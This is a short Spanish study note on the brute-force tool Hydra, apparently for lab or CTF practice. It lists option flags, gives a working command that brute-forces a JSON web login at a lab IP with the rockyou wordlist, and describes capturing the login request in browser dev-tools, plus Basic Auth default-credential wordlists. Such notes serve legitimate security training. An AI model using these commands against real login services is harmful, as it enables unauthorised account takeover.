Herramienta para realizar fuerza bruta

| Parametro | Funcion                    |
| --------- | -------------------------- |
| -l        | Usuario especifico         |
| -L        | Lista de usuarios          |
| -p        | unica password             |
| -P        | Listado de password        |
| -s        | Para seleccionar el puerto |


##### Web
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s 3000 http-post-form "/login:{\"user\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=Incorrect"

- Para sacar el http-post-form nos iremos a la web en el login escribiremos lo que sea y le daremos enter -- dev-tools -- Network -- Peticion post -- request y lo veremos
	![[Pasted image 20260515001459.png]]


##### FTP
![[Pasted image 20260705143047.png]]


##### Basic Auth
![[Pasted image 20260705161908.png]]
-C --> wordlist de posibles password pero con la siguiente estructura
	![[Pasted image 20260705161644.png]]
	"usuario":"password"

podemos acudir a wordlist de github 
https://github.com/rix4uni/WordList/blob/main/default-username-password.txt

-s --> Puerto
-f --> Ip de la maquina victima
-http-get --> porque se acontece en el index si no (/"donde corra el login")